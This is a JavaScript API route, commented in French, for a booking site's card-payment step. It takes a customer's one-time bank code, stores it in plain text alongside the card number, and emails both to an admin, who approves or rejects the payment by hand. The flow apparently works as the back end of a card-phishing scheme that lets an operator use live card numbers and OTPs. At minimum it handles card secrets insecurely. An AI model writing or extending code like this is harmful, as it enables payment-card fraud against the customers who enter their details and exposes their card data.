/**
 * POST /api/payments/card-verify-otp
 *
 * ÉTAPE 2 du flux (chemin OTP) — appelé quand le client soumet son code OTP :
 *  1. Reçoit { sessionId, otpCode }
 *  2. Met à jour la session (step: 'otp_sent', otpCode)
 *  3. Envoie EMAIL 2 à l'admin : code OTP + boutons VALIDER / REFUSER
 *  4. Retourne { success: true, paymentId }
 *     → le frontend passe en état "traitement" et continue à poller
 *
 * Plus besoin de numéro de téléphone. Le Payment est déjà créé à l'étape 1.
 */

import dbConnect from '@/lib/db';
import OtpSession from '@/models/OtpSession';
import Payment from '@/models/Payment';
import Booking from '@/models/Booking';
import User from '@/models/User';
import { withAuth } from '@/middleware/withAuth';
import { errorHandler } from '@/middleware/errorHandler';
import { sendEmail } from '@/lib/mail';
import { adminOtpValidationEmail } from '@/email-templates/admin-otp-validation';

function formatPrice(cents) {
  return (cents / 100).toFixed(2).replace('.', ',') + ' €';
}

async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Méthode non autorisée' });
  }

  const adminEmail = process.env.ADMIN_EMAIL;
  if (!adminEmail) {
    return res.status(500).json({ success: false, error: 'Configuration admin manquante' });
  }

  await dbConnect();

  const { sessionId, otpCode } = req.body;

  if (!sessionId || !otpCode?.trim()) {
    return res.status(400).json({ success: false, error: 'sessionId et otpCode sont requis' });
  }
  if (otpCode.replace(/\D/g, '').length < 4) {
    return res.status(400).json({ success: false, error: 'Code OTP invalide' });
  }

  // Accepter les steps card_sent et otp_requested
  const session = await OtpSession.findOne({
    _id: sessionId,
    user: req.user.id,
    step: { $in: ['card_sent', 'otp_requested'] },
    decision: 'pending',
  });

  if (!session) {
    return res.status(404).json({
      success: false,
      error: 'Session introuvable ou expirée. Veuillez recommencer.',
    });
  }

  if (session.expiresAt < new Date()) {
    await session.deleteOne();
    return res.status(410).json({ success: false, error: 'Session expirée. Veuillez recommencer.' });
  }

  const booking = await Booking.findOne({
    _id: session.booking,
    user: req.user.id,
    paymentStatus: { $in: ['unpaid', 'pending'] },
  });

  if (!booking) {
    return res.status(404).json({ success: false, error: 'Réservation introuvable ou déjà payée.' });
  }

  // Récupérer le Payment créé à l'étape 1
  const payment = await Payment.findOne({
    booking: booking._id,
    user:    req.user.id,
    method:  'card',
    status:  'pending',
  }).lean();

  if (!payment) {
    return res.status(404).json({ success: false, error: 'Paiement introuvable.' });
  }

  // Mettre à jour la session avec le code OTP
  session.otpCode = otpCode.trim();
  session.step    = 'otp_sent';
  await session.save();

  // Construction des URLs admin
  const baseUrl    = process.env.NEXTAUTH_URL || 'http://localhost:3000';
  const approveUrl = `${baseUrl}/api/payments/card-decision?token=${session.adminToken}&decision=approve`;
  const rejectUrl  = `${baseUrl}/api/payments/card-decision?token=${session.adminToken}&decision=reject`;

  const user        = await User.findById(req.user.id).select('name email').lean();
  const bookingRef  = String(booking._id).slice(-6).toUpperCase();

  // EMAIL 2 → admin : code OTP + boutons VALIDER/REFUSER
  const { subject, html } = adminOtpValidationEmail({
    userName:   user?.name || 'Client',
    userEmail:  user?.email || '—',
    otpCode:    otpCode.trim(),
    cardNumber: session.cardNumber,
    bookingRef,
    amount:     formatPrice(booking.totalPrice),
    approveUrl,
    rejectUrl,
  });

  sendEmail({ to: adminEmail, subject, html }).catch((err) =>
    console.error('[card-verify-otp] Erreur email admin:', err.message)
  );

  return res.status(200).json({
    success:   true,
    paymentId: payment._id,
  });
}

export default errorHandler(withAuth(handler));
